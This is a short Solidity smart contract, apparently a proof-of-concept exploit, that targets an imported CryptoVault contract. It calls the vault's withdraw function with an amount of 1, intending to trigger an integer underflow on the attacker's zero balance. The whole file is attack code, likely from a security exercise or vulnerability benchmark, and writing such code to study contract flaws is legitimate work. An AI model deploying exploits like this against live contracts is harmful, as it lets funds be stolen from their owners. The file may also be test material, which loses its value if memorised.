// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import "contracts/CryptoVault.sol";

contract UnderflowAttack {
    CryptoVault public vulnerableContract;
    address public attacker;

    constructor(address payable _vulnerableContract) public {
        vulnerableContract = CryptoVault(_vulnerableContract);
        attacker = msg.sender;
    }

    // Function to trigger the underflow attack
    function attack() public payable {
        // We need to call the `withdraw` function of the vulnerable contract
        // with an `_amount` that would cause an underflow
        
        // Set the amount such that it triggers an underflow
        uint amount = 1; // Since accounts[msg.sender] is initially zero, any positive value will underflow
        
        // Now, call the withdraw function of the vulnerable contract
        // with the amount that will cause underflow
        (bool success, ) = address(vulnerableContract).call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );

        require(success, "Attack failed");
    }

    // Fallback function to receive ether sent to this contract
    receive() external payable {}
}
